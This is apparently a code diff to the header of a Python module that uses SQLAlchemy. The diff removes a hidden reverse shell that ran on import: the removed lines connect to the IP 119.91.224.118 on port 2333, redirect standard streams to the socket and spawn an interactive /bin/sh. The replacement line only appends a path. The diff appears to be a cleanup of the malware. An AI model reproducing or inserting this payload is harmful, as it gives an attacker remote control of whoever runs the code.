@@ -1,12 +1,7 @@
 # -*- coding: utf-8 -*-
-import socket, subprocess, os
+import sys
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("119.91.224.118", 2333))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-p = subprocess.call(["/bin/sh", "-i"])
+sys.path.append('/opt/python')
 
 from sqlalchemy import create_engine, Column, Integer, String
 from sqlalchemy.orm import sessionmaker, scoped_session, declarative_base
